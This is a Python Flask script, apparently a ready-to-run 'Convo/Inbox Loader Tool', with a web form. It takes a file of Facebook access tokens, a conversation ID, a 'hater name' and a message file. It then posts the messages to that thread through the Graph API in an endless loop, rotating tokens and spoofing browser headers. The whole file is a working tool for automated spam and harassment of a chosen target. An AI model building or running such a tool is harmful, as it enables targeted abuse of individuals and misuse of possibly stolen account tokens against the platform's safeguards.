import hashlib
import time
import os
from flask import Flask, request
import requests

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Set a password for the script
script_password = " Jai Shree RAM"  # Replace with your desired password
hashed_password = hashlib.sha256(script_password.encode()).hexdigest()

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        entered_password = request.form.get('password')

        # Check if the entered password is correct
        if hashlib.sha256(entered_password.encode()).hexdigest() == hashed_password:
            access_tokens_file = request.files['accessToken']
            access_tokens = access_tokens_file.readlines()
            num_tokens = len(access_tokens)
            convo_id = request.form.get('threadId')
            haters_name = request.form.get('kidx')
            time_interval = int(request.form.get('time'))

            txt_file = request.files['txtFile']
            messages = txt_file.read().decode().splitlines()
            num_messages = len(messages)
            max_tokens = min(num_tokens, num_messages)

            try:
                while True:
                    for message_index in range(num_messages):
                        token_index = message_index % max_tokens
                        access_token = access_tokens[token_index].decode().strip()
                        message = haters_name + ' ' + messages[message_index].strip()

                        api_url = f'https://graph.facebook.com/v15.0/t_{convo_id}/'
                        parameters = {'access_token': access_token, 'message': message}
                        response = requests.post(api_url, json=parameters, headers=headers)

                        if response.status_code == 200:
                            print(f"Message sent using token {access_token}: {message}")
                        else:
                            print(f"Failed to send message using token {access_token}: {message}")

                        time.sleep(time_interval)

            except Exception as e:
                print(f"Error while sending message: {e}")
                time.sleep(30)

        else:
            return "Incorrect password. Access denied."

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sahil❤️CHOUDHARY</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
      background-color: #f8f9fa;
    }
    .container{
      max-width: 500px;
      background-color: #fff;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      margin: 0 auto;
      margin-top: 20px;
    }
    .header{
      text-align: center;
      padding-bottom: 20px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: #888;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mb-3"> 𝗦𝗬𝗦𝗧𝗨𝗠𝗠 𝗛𝗘𝗥𝗘
                                     ⒷⓎ
    𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘😈
    <h1 class="mt-3">🅾🆆🅽🅴🆁]|^>>>• 𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘  </h1>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="password">Enter Password:</label>
        <input type="password" class="form-control" id="password" name="password" required>
      </div>
      <div class="mb-3">
        <label for="accessToken">Attach Token File:</label>
        <input type="file" class="form-control" id="accessToken" name="accessToken" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="threadId">Enter Convo/Inbox ID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">Enter Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">Select Your Notepad File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time">Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; Developed by 𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘 . All Rights Reserved.</p>
    <p>Convo/Inbox Loader Tool</p>
    <a href="https://facebook.com/100040009717781"><|-/😈sʌʜıɭ Cʜo𝐮DʜʌrƔ➤➖😈❤️➖❥</a>
    <p>
    Keep enjoying</p>
  </footer>
</body>
  </html>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
    app.run(debug=True)
